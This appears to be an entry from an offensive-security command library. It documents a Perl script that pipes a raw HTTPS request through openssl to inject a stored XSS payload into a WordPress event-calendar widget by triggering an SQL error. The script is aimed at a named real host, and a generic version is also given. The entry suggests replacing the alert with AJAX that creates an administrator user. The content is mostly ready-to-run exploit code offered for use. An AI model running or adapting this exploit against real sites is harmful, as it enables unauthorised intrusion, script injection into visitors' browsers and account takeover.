---
id: cmd-perl-xss-inject
data: >-
  #!/usr/bin/perl

  open(NC,"|openssl s_client -connect drive.uber.com:443 -quiet") || die;

  print NC "GET
  /oh/?ai1ec_js_widget=ai1ec_agenda_widget&render=true&events_per_page=$%&xss=<svg/onload=alert(/stored-xss/.source)>\r\n";

  print NC "HTTP/1.1\r\n";

  print NC "Host: drive.uber.com\r\n";

  print NC "\r\n";

  close(NC);
tags:
  - xss
  - injection
  - http
type: command
output: null
executor: perl
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:58.960Z'
verified: false
validated: true
submitted: true
---
# perl-inject-xss-http-request

## Command

```perl
#!/usr/bin/perl
open(NC,"|openssl s_client -connect drive.uber.com:443 -quiet") || die;
print NC "GET /oh/?ai1ec_js_widget=ai1ec_agenda_widget&render=true&events_per_page=$%&xss=<svg/onload=alert(/stored-xss/.source)>\r\n";
print NC "HTTP/1.1\r\n";
print NC "Host: drive.uber.com\r\n";
print NC "\r\n";
close(NC);
```

## Description

This Perl script sends a raw, unencoded HTTPS GET request to a WordPress site's calendar endpoint to inject a stored XSS payload by triggering an SQL format error. It pipes to OpenSSL for HTTPS handling without browser-like encoding.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| connect | Target host:port (e.g., drive.uber.com:443) | Yes |
| GET path | Endpoint and query params (e.g., /oh/?ai1ec_js_widget=...&events_per_page=...) | Yes |
| Host | Target domain header | Yes |

## Examples

### Basic Usage

```perl
#!/usr/bin/perl
open(NC,"|openssl s_client -connect target.com:443 -quiet") || die;
print NC "GET /oh/?ai1ec_js_widget=ai1ec_agenda_widget&render=true&events_per_page=$%&xss=<svg/onload=alert(1)>\r\n";
print NC "HTTP/1.1\r\n";
print NC "Host: target.com\r\n";
print NC "\r\n";
close(NC);
```

### Advanced Usage

Modify payload for custom JS, e.g., replace alert with AJAX for user creation.

## Expected Output

HTTP 302 redirect to front page, with server logs showing SQL error; no immediate JS execution.

## Related

- [[commands/openssl-connect-https]]
- [[procedures/Inject-XSS-Payload-via-Malformed-HTTP-Request]]
